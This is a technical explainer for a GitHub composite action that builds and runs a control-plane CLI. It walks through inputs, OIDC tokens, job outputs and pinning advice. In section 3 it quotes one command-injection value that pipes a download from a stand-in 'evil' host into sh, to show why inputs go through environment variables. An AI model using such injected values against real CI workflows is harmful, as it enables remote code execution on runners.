# How `uses: cloudyhomelab/control-plane/action@main` works

This explains the workflow step that calls the control plane:

```yaml
- uses: cloudyhomelab/control-plane/action@main
  with:
    server: ${{ env.CP_SERVER }}
    audience: ${{ env.CP_AUDIENCE }}
    action: network.plan
    ref: ${{ github.ref }}
    params: |
      region=eu-west-1
```

`uses:` tells the GitHub runner: "download this action and run it as one step". Here the
action is the `action/` folder of the controlplane repo.

## 1. Reading the `uses:` string

```
cloudyhomelab/control-plane/action@main
└──┬─────┘ └────┬─────┘ └─┬──┘ └┬─┘
  owner       repo      path   git ref (branch, tag or commit SHA)
```

When the job reaches this step, the runner:

1. Downloads `github.com/cloudyhomelab/control-plane` at `main`. It does this itself, before any
   step runs; you don't need `actions/checkout` for it.
2. Goes into the `action/` subfolder and reads `action/action.yml`. That file is what makes a
   folder an action.
3. Sees `runs: using: composite`, so it runs the steps listed in that file inside your job,
   on the same runner.

Without a path (`cloudyhomelab/control-plane@main`), it would look for `action.yml` at the repo
root. The subfolder keeps the action separate from the server code.

## 2. `with:` fills the action's inputs

`action/action.yml` declares which inputs exist:

```yaml
inputs:
  server:   { required: true }
  audience: { required: true }
  action:   { required: true }
  params:   { default: "" }
  ref:      { default: "" }
  input-job: { default: "" }
```

Each key under `with:` sets one of these. Inside the action they are read as
`${{ inputs.server }}`, `${{ inputs.params }}` and so on. An unknown key only gets a warning,
and a missing required one fails the step.

The `${{ ... }}` parts are evaluated in your workflow before the action ever sees them:

- `${{ env.CP_SERVER }}` comes from the `env:` block at the top of the workflow.
- `${{ github.ref }}` is the ref this run was triggered on. On a push to main that's
  `refs/heads/main`. On a pull request it's `refs/pull/<n>/merge`, which `network.plan`
  allows in its `allowed_refs`.
- `params: |` is a YAML block string, so it arrives as the text `region=eu-west-1\n`.
  Put one `key=value` per line.

## 3. What the action then does

The composite action runs three steps from `action/action.yml`.

**Step 1: install Go.**

```yaml
- uses: actions/setup-go@v5
  with:
    go-version-file: ${{ github.action_path }}/../go.mod
```

`github.action_path` is where the runner downloaded the action, i.e.
`.../cloudyhomelab/control-plane/main/action`, so `../go.mod` is the controlplane repo's `go.mod`.

**Step 2: build `cpctl`** from that same download:

```yaml
- working-directory: ${{ github.action_path }}/..
  run: go build -trimpath -o "$RUNNER_TEMP/cpctl" ./cmd/cpctl
```

**Step 3: run it.** The inputs are passed as environment variables, not pasted into the script:

```yaml
env:
  CONTROLPLANE_URL: ${{ inputs.server }}
  CONTROLPLANE_AUDIENCE: ${{ inputs.audience }}
  CP_ACTION: ${{ inputs.action }}
  CP_PARAMS: ${{ inputs.params }}
  CP_REF: ${{ inputs.ref }}
run: |
  # turns each params line into -p key=value, adds -ref / -input-job if set
  "$RUNNER_TEMP/cpctl" run "${args[@]}" "$CP_ACTION"
```

Passing inputs through env matters. If the script used `${{ inputs.params }}` directly, a
value like `x"; curl evil | sh; "` would become shell code on the runner. As an env var it
stays plain data.

For the step above, what finally runs on the runner is:

```
cpctl run -p region=eu-west-1 -ref refs/heads/main network.plan
```

From there `cpctl`:

1. Gets an OIDC token for `audience` from the runner.
2. POSTs the job to the control plane.
3. Streams the job log into the step output.
4. Exits with the job's exit code, so a failed job fails the step.

## 4. Getting results back

The action declares outputs that map to what `cpctl` writes to `$GITHUB_OUTPUT`:

```yaml
outputs:
  job_id: { value: ${{ steps.run.outputs.job_id }} }
  status: { value: ${{ steps.run.outputs.status }} }
```

That's how a workflow hands the plan's id to the apply job:

```yaml
plan:
  outputs:
    job_id: ${{ steps.plan.outputs.job_id }}   # step output -> job output
  steps:
    - id: plan                                 # the id makes steps.plan.* work
      uses: cloudyhomelab/control-plane/action@main
      ...
apply:
  needs: plan
  steps:
    - uses: cloudyhomelab/control-plane/action@main
      with:
        action: network.apply
        input-job: ${{ needs.plan.outputs.job_id }}
```

## 5. Things to know

- **Permissions:** the calling workflow needs `permissions: id-token: write`. Without it the
  runner won't hand out an OIDC token, and `cpctl` fails with "no OIDC token available".
- **Private repo:** if `cloudyhomelab/control-plane` is private, other repos can only use its
  action after you set Settings > Actions > General > Access to "Accessible from repositories
  in the 'cloudyhome' organization".
- **`@main` is a moving target:** every run uses whatever `main` is at that moment, so a push
  to the controlplane repo changes every workflow that uses it. Once it's stable, pin to a tag
  (`@v1`) or a full commit SHA. A SHA can't be moved.
- **Inside the controlplane repo you can use a local path:** a workflow there can say
  `uses: ./action`, which needs `actions/checkout` first since the path is relative to the
  checkout. That's handy for testing changes to the action before merging.
- **Speed:** building `cpctl` adds roughly 20 to 40 seconds per step (Go setup plus compile).
  If that gets annoying, publish `cpctl` as a release binary and change step 2 to download it.
